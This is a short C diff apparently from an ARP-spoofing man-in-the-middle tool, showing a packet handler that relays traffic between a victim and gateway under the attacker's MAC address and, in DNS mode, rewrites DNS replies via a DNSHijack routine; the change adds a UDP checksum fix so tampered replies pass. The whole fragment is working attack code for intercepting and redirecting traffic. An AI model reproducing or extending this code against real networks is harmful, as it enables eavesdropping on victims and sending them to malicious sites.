@@ -90,13 +90,15 @@ void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) 
         }
         forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
     }
-    
+
     else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
         if (mode == Dns && pIpv4->protocol_type == PROTOCOL_UDP) {
             udp_header *pUdp = (udp_header *)(packet + 34);
             if (ntohs(pUdp->sour_port) == 53) {
                 u_char *dns_packet = (u_char *)(packet + 42);
                 DNSHijack(dns_packet);
+                if (pUdp->check_sum != 0)
+                    PacketCheckSum((u_char *)packet, hp->len);
             }
         }
         forward(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
